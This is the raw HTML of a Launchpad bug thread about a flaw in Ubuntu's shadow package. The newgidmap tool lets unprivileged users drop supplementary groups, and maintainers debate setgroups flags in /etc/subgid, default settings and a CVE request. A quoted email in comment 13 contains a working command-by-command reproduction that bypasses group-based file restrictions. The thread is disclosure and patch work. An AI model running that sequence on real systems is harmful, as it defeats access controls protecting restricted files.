          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/11" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cyphar" class="sprite person">Aleksa Sarai (cyphar)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-01-15T14:39:10.374815+00:00" title="2018-01-15 14:39:10 UTC">on 2018-01-15</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/11"> #11</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p><span class="foldable-quoted">&gt; Thanks for replying Eric, but I&#x27;m having trouble reproducing what you&#x27;ve<br />
&gt; posted. I can&#x27;t write the gid map until I&#x27;ve written deny to<br />
&gt; /prod/$<wbr />pid/setgroups, not the other way around. There might be some nuance<br />
&gt; I&#x27;ve missed.
</span></p>
<p>Yes, this is a security feature. setgroups must be written to *before* gid_map<br />
(the reason for this is explained further in user_namespaces<wbr />(7)). And only<br />
privileged users are allowed to write to gid_map if setgroups is set to allow.</p>
<p><span class="foldable-quoted">&gt; Also, newgidmap will allow a user to map their own GID to 0 in the user<br />
&gt; namespace, even when there is no entry for that user in /etc/subgid.
</span></p>
<p>This is something that is generally required for a container to function, and<br />
isn&#x27;t fundamentally a security issue because users are already allowed to do<br />
that without privileges (this is how rootless containers and LXC unprivileged<br />
containers work) -- *unless* in this mode newgidmap is setting setgroups=allow<br />
(in which case this is a major security problem).</p>
<p><span class="foldable-quoted">&gt; What if newgidmap wrote &quot;deny&quot; to /proc/$<wbr />pid/setgroups unless the user is<br />
&gt; whitelisted in some config file, probably separate from /etc/subgid, as<br />
&gt; Stéphane suggested?
</span></p>
<p>:+1: I&#x27;d prefer if we implemented this by changing the /etc/subgid schema so<br />
that rather than having the format</p>
<p>&nbsp;&nbsp;&nbsp;user:id:id_cnt</p>
<p>It has the format</p>
<p>&nbsp;&nbsp;&nbsp;user:<wbr />id:id_cnt[<wbr />:flagA,<wbr />flagB,.<wbr />..]</p>
<p>And we define flags &quot;allow_setgroups&quot; and &quot;deny_setgrouops&quot; (with<br />
&quot;deny_setgroups&quot; being the default). This way, administrators can be *explicit*<br />
about the denial, we don&#x27;t add any new configuration files, and it&#x27;s backwards<br />
compatible (with security being opt-out).</p>
<p>I imagine making deny_setgroups might be a *bit* contentious, but in the worst<br />
case we could have a migration script that asks users (or just add a document<br />
about it to the logfile for the upgrade).</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">&gt; Thanks for replying Eric, but I'm having trouble reproducing what you've
&gt; posted. I can't write the gid map until I've written deny to
&gt; /prod/$pid/setgroups, not the other way around. There might be some nuance
&gt; I've missed.

Yes, this is a security feature. setgroups must be written to *before* gid_map
(the reason for this is explained further in user_namespaces(7)). And only
privileged users are allowed to write to gid_map if setgroups is set to allow.

&gt; Also, newgidmap will allow a user to map their own GID to 0 in the user
&gt; namespace, even when there is no entry for that user in /etc/subgid.

This is something that is generally required for a container to function, and
isn't fundamentally a security issue because users are already allowed to do
that without privileges (this is how rootless containers and LXC unprivileged
containers work) -- *unless* in this mode newgidmap is setting setgroups=allow
(in which case this is a major security problem).

&gt; What if newgidmap wrote "deny" to /proc/$pid/setgroups unless the user is
&gt; whitelisted in some config file, probably separate from /etc/subgid, as
&gt; Stéphane suggested?

:+1: I'd prefer if we implemented this by changing the /etc/subgid schema so
that rather than having the format

   user:id:id_cnt

It has the format

   user:id:id_cnt[:flagA,flagB,...]

And we define flags "allow_setgroups" and "deny_setgrouops" (with
"deny_setgroups" being the default). This way, administrators can be *explicit*
about the denial, we don't add any new configuration files, and it's backwards
compatible (with security being opt-out).

I imagine making deny_setgroups might be a *bit* contentious, but in the worst
case we could have a migration script that asks users (or just add a document
about it to the logfile for the upgrade).
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/12" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~suda-kyoto" class="sprite person">Akihiro Suda (suda-kyoto)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-01-15T15:13:56.463747+00:00" title="2018-01-15 15:13:56 UTC">on 2018-01-15</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/12"> #12</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p><span class="foldable-quoted">&gt; And we define flags &quot;allow_setgroups&quot; and &quot;deny_setgrouops&quot; (with<br />
&quot;deny_setgroups&quot; being the default).
</span></p>
<p>I think allow_setgropus should be the default for keeping compatibility.</p>
<p>However, useradd(8) may print warning for the default configuration.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">&gt; And we define flags "allow_setgroups" and "deny_setgrouops" (with
"deny_setgroups" being the default).


I think allow_setgropus should be the default for keeping compatibility.

However, useradd(8) may print warning for the default configuration.

</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/13" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-01-15T16:56:19+00:00" title="2018-01-15 16:56:19 UTC">on 2018-01-15</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/13"> #13</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  <a href="https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357/comments/13/+download">Download full text</a> (5.0 KiB)
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This sounds acceptable to me.  Issues or (even better) PRs against<br />
github.<wbr />com/shadow-<wbr />maint/shadow would be great :)</p>
<p>Indeed the default should be the more permissible.  (I won&#x27;t accept<br />
patches which require changes to the container runtime.)</p>
<p>On Mon, Jan 15, 2018 at 9:13 AM, Akihiro Suda &lt;email address hidden&gt; wrote:<br />
<span class="foldable-quoted">
&gt;&gt; And we define flags &quot;allow_setgroups&quot; and &quot;deny_setgrouops&quot; (with<br />
&gt; &quot;deny_setgroups&quot; being the default).<br />
&gt;<br />
&gt;<br />
&gt; I think allow_setgropus should be the default for keeping compatibility.<br />
&gt;<br />
&gt; However, useradd(8) may print warning for the default configuration.<br />
&gt;<br />
&gt; --<br />
&gt; You received this bug notification because you are subscribed to the bug<br />
&gt; report.<br />
&gt; <a rel="nofollow" href="https://bugs.launchpad.net/bugs/1729357">https:/<wbr />/bugs.launchpad<wbr />.net/bugs/<wbr />1729357</a><br />
&gt;<br />
&gt; Title:<br />
&gt;   unprivileged user can drop supplementary groups<br />
&gt;<br />
&gt; Status in shadow package in Ubuntu:<br />
&gt;   Confirmed<br />
&gt;<br />
&gt; Bug description:<br />
&gt;   Distribution: Ubuntu 16.04.3 LTS<br />
&gt;   Kernel: 4.4.0-97-generic<br />
&gt;   uidmap package version: 1:4.2-3.1ubuntu5.3<br />
&gt;<br />
&gt;   The newgidmap setuid executable allows any user to write a single<br />
&gt;   mapping line to the gid_map of a process whose identity is the same as<br />
&gt;   the calling process, as long as that mapping line maps the process&#x27;s<br />
&gt;   own GID outside of the user namespace to GID 0 inside the user<br />
&gt;   namespace.<br />
&gt;<br />
&gt;   Newgidmap will write the mapping regardless of the content of<br />
&gt;   /proc/$<wbr />process_<wbr />being_mapped/<wbr />setgroups, which will initially contain<br />
&gt;   the string &quot;allow&quot;. After this mapping is performed, and also after<br />
&gt;   the process&#x27; uid_map is written with newuidmap, the process in the<br />
&gt;   user namespace will be able to use the setgroups system call to drop<br />
&gt;   supplementary groups.<br />
&gt;<br />
&gt;   This is possible even if there is no entry for the user in<br />
&gt;   /etc/subgid, because no subordinate GIDs are actually being used.<br />
&gt;<br />
&gt;   This allows any user to circumvent the use of supplementary groups as<br />
&gt;   blacklists, e.g. for some file owned by root:blacklist with permission<br />
&gt;   bits 0604 (octal). Normally any process whose identity included the<br />
&gt;   group &quot;blacklist&quot; in its supplementary groups would not be able to<br />
&gt;   read that file. By performing this exploit using newgidmap, they can<br />
&gt;   drop all supplementary groups and read that file.<br />
&gt;<br />
&gt;   If newgidmap was not available, unprivileged users would not be able<br />
&gt;   to write a process&#x27;s gid_map until writing &quot;deny&quot; to<br />
&gt;   /proc/$<wbr />pid/setgroups. A fix for this might be for newgidmap to check<br />
&gt;   the content of /proc/$<wbr />process_<wbr />being_mapped/<wbr />setgroups is &quot;deny&quot;, but we<br />
&gt;   have not tried to patch this ourselves.<br />
&gt;<br />
&gt;   An example using 2 login shells for a user named &quot;someone&quot; on Ubuntu<br />
&gt;   Xenial, with the uidmap package installed:<br />
&gt;<br />
&gt;   Shell 1<br />
&gt;<br />
&gt;   someone@<wbr />ubuntu-<wbr />xenial:<wbr />~$ id<br />
&gt;   uid=1001(someone) gid=1001(someone) groups=<wbr />1001(someone)<wbr />,1002(restricte<wbr />d)<br />
&gt;<br />
&gt;   someone@<wbr />ubuntu-<wbr />xenial:<wbr />~$ ls -al /tmp/should_<wbr />restrict<br />
&gt;   -rw----r-- 1 root restricted 8 Nov  1 12:23 /tmp/should_<wbr />restrict<br />
&gt;<br />
&gt;   someone@<wbr />ubuntu-<wbr />xenial:<wbr />~$ cat /tmp/should_<wbr />restrict<br />
&gt;   cat: /tmp/should_<wbr />restrict: Permission denied<br />
&gt;<br />
&gt;   someone@<wbr />ubuntu-<wbr />xenial:<wbr />~$ unshare -U --setgroups allow #<br />
&gt;   /proc/self/<wbr />setgroups already contains &#x27;allow&#x27;, but let&#x27;s be explicit<br />
&gt;<br />
&gt;   nobody@<wbr />ubuntu-<wbr />xenial:<wbr />~$ echo $$<br />
&gt;   1878<br />
&gt;<br />
&gt;   Sh...
</span></p></div>
    
    <p>
      <a href="/ubuntu/+source/shadow/+bug/1729357/comments/13">Read more...</a>
    </p>
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This sounds acceptable to me.  Issues or (even better) PRs against
github.com/shadow-maint/shadow would be great :)

Indeed the default should be the more permissible.  (I won't accept
patches which require changes to the container runtime.)


On Mon, Jan 15, 2018 at 9:13 AM, Akihiro Suda &lt;suda.kyoto@gmail.com&gt; wrote:
&gt;&gt; And we define flags "allow_setgroups" and "deny_setgrouops" (with
&gt; "deny_setgroups" being the default).
&gt;
&gt;
&gt; I think allow_setgropus should be the default for keeping compatibility.
&gt;
&gt; However, useradd(8) may print warning for the default configuration.
&gt;
&gt; --
&gt; You received this bug notification because you are subscribed to the bug
&gt; report.
&gt; https://bugs.launchpad.net/bugs/1729357
&gt;
&gt; Title:
&gt;   unprivileged user can drop supplementary groups
&gt;
&gt; Status in shadow package in Ubuntu:
&gt;   Confirmed
&gt;
&gt; Bug description:
&gt;   Distribution: Ubuntu 16.04.3 LTS
&gt;   Kernel: 4.4.0-97-generic
&gt;   uidmap package version: 1:4.2-3.1ubuntu5.3
&gt;
&gt;   The newgidmap setuid executable allows any user to write a single
&gt;   mapping line to the gid_map of a process whose identity is the same as
&gt;   the calling process, as long as that mapping line maps the process's
&gt;   own GID outside of the user namespace to GID 0 inside the user
&gt;   namespace.
&gt;
&gt;   Newgidmap will write the mapping regardless of the content of
&gt;   /proc/$process_being_mapped/setgroups, which will initially contain
&gt;   the string "allow". After this mapping is performed, and also after
&gt;   the process' uid_map is written with newuidmap, the process in the
&gt;   user namespace will be able to use the setgroups system call to drop
&gt;   supplementary groups.
&gt;
&gt;   This is possible even if there is no entry for the user in
&gt;   /etc/subgid, because no subordinate GIDs are actually being used.
&gt;
&gt;   This allows any user to circumvent the use of supplementary groups as
&gt;   blacklists, e.g. for some file owned by root:blacklist with permission
&gt;   bits 0604 (octal). Normally any process whose identity included the
&gt;   group "blacklist" in its supplementary groups would not be able to
&gt;   read that file. By performing this exploit using newgidmap, they can
&gt;   drop all supplementary groups and read that file.
&gt;
&gt;   If newgidmap was not available, unprivileged users would not be able
&gt;   to write a process's gid_map until writing "deny" to
&gt;   /proc/$pid/setgroups. A fix for this might be for newgidmap to check
&gt;   the content of /proc/$process_being_mapped/setgroups is "deny", but we
&gt;   have not tried to patch this ourselves.
&gt;
&gt;   An example using 2 login shells for a user named "someone" on Ubuntu
&gt;   Xenial, with the uidmap package installed:
&gt;
&gt;   Shell 1
&gt;
&gt;   someone@ubuntu-xenial:~$ id
&gt;   uid=1001(someone) gid=1001(someone) groups=1001(someone),1002(restricted)
&gt;
&gt;   someone@ubuntu-xenial:~$ ls -al /tmp/should_restrict
&gt;   -rw----r-- 1 root restricted 8 Nov  1 12:23 /tmp/should_restrict
&gt;
&gt;   someone@ubuntu-xenial:~$ cat /tmp/should_restrict
&gt;   cat: /tmp/should_restrict: Permission denied
&gt;
&gt;   someone@ubuntu-xenial:~$ unshare -U --setgroups allow #
&gt;   /proc/self/setgroups already contains 'allow', but let's be explicit
&gt;
&gt;   nobody@ubuntu-xenial:~$ echo $$
&gt;   1878
&gt;
&gt;   Shell 2
&gt;
&gt;   someone@ubuntu-xenial:~$ cat /etc/subuid
&gt;   lxd:100000:65536
&gt;   root:100000:65536
&gt;   ubuntu:165536:65536
&gt;
&gt;   someone@ubuntu-xenial:~$ cat /etc/subgid
&gt;   lxd:100000:65536
&gt;   root:100000:65536
&gt;   ubuntu:165536:65536
&gt;
&gt;   # There are no entries in /etc/sub{u,g}id for someone, but this
&gt;   doesn't matter that much as subordinate IDs are not being requested.
&gt;
&gt;   someone@ubuntu-xenial:~$ newuidmap 1878 0 1001 1
&gt;
&gt;   someone@ubuntu-xenial:~$ newgidmap 1878 0 1001 1
&gt;
&gt;   Back to shell 1
&gt;
&gt;   nobody@ubuntu-xenial:~$ id
&gt;   uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
&gt;
&gt;   # The presence of the "nogroup" supplementary group indicates that
&gt;   some unmapped GIDs are present as supplementary GIDs. The kernel knows
&gt;   that this process still has "restricted" in its supplementary groups,
&gt;   so it can't read the restricted file yet.
&gt;
&gt;   nobody@ubuntu-xenial:~$ cat /tmp/should_restrict
&gt;   cat: /tmp/should_restrict: Permission denied
&gt;
&gt;   # The process has gained CAP_SETGID in its user namespace by becoming
&gt;   UID 0. /proc/$pid/setgroups contains "allow", so it can call
&gt;   setgroups(2). By su-ing to root (itself, in the user namespace), it
&gt;   can drop the supplementary groups. It can't read /root/.bashrc as that
&gt;   file is owned by UID 0 in the initial user namespace, which creates
&gt;   some distracting error output but doesn't matter in this case.
&gt;
&gt;   nobody@ubuntu-xenial:~$ su root
&gt;   su: Authentication failure
&gt;   (Ignored)
&gt;   bash: /root/.bashrc: Permission denied
&gt;
&gt;   # Supplementary groups have been dropped
&gt;
&gt;   root@ubuntu-xenial:~# id
&gt;   uid=0(root) gid=0(root) groups=0(root)
&gt;
&gt;   # It can read the restricted file
&gt;
&gt;   root@ubuntu-xenial:~# cat /tmp/should_restrict
&gt;   content
&gt;
&gt; To manage notifications about this bug go to:
&gt; https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357/+subscriptions
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/14" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cyphar" class="sprite person">Aleksa Sarai (cyphar)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-01-15T23:18:08.134240+00:00" title="2018-01-15 23:18:08 UTC">on 2018-01-15</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/14"> #14</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Serge: I will submit a patch later today. However, I just thought that it&#x27;s probably better that &quot;allow_setgroups&quot; should be &quot;ignore_setgroups&quot; and we retain the current behaviour (we don&#x27;t write anything to /proc/$<wbr />pid/setgroups) -- which allows a user (or runtime) to explicitly disable setgroups even if they would normally have the right to use setgroups.</p>
<p>Does that sound okay to you? I will make the default ignore_setgroups, but IMO we should change the default for `useradd` to (by default) set deny_setgroups.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Serge: I will submit a patch later today. However, I just thought that it's probably better that "allow_setgroups" should be "ignore_setgroups" and we retain the current behaviour (we don't write anything to /proc/$pid/setgroups) -- which allows a user (or runtime) to explicitly disable setgroups even if they would normally have the right to use setgroups.

Does that sound okay to you? I will make the default ignore_setgroups, but IMO we should change the default for `useradd` to (by default) set deny_setgroups.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/15" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cyphar" class="sprite person">Aleksa Sarai (cyphar)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-01-15T23:18:56.168527+00:00" title="2018-01-15 23:18:56 UTC">on 2018-01-15</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/15"> #15</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Oh, and we should definitely get a CVE assigned IMO.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Oh, and we should definitely get a CVE assigned IMO.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/16" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~suda-kyoto" class="sprite person">Akihiro Suda (suda-kyoto)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-02-15T03:32:51.103331+00:00" title="2018-02-15 03:32:51 UTC">on 2018-02-15</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/16"> #16</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@cyphar</p>
<p>Did you submit patch/CVE?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@cyphar

Did you submit patch/CVE?
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/17" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cyphar" class="sprite person">Aleksa Sarai (cyphar)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-02-15T06:17:06.942268+00:00" title="2018-02-15 06:17:06 UTC">on 2018-02-15</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/17"> #17</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I had a preliminary patch written, but it was getting quite complicated (shadow&#x27;s codebase is much more complicated than I expected -- and the /etc/subgid parsing code is intertwined with the parsing code for all of the other /etc/... files). I am working on it though.</p>
<p>I&#x27;ve also email the SUSE Security team about getting a CVE assigned, though I&#x27;m not sure if it&#x27;s better that we get it assigned or that the Ubuntu folks get it assigned.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I had a preliminary patch written, but it was getting quite complicated (shadow's codebase is much more complicated than I expected -- and the /etc/subgid parsing code is intertwined with the parsing code for all of the other /etc/... files). I am working on it though.

I've also email the SUSE Security team about getting a CVE assigned, though I'm not sure if it's better that we get it assigned or that the Ubuntu folks get it assigned.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/18" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cyphar" class="sprite person">Aleksa Sarai (cyphar)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-02-15T11:29:03.235616+00:00" title="2018-02-15 11:29:03 UTC">on 2018-02-15</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/18"> #18</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I&#x27;ve just sent a request for a CVE. I&#x27;m working on the patch now. My current plan is that allow_setgroups will be the default for all mappings that are present in /etc/subgid -- but any &quot;implicit&quot; mappings (like mapping your own group) will be deny_setgroups by default (because that&#x27;s the biggest security issue coming out of this bug -- that *any* user can drop groups, not just the ones with subgids set up).</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I've just sent a request for a CVE. I'm working on the patch now. My current plan is that allow_setgroups will be the default for all mappings that are present in /etc/subgid -- but any "implicit" mappings (like mapping your own group) will be deny_setgroups by default (because that's the biggest security issue coming out of this bug -- that *any* user can drop groups, not just the ones with subgids set up).</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/19" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
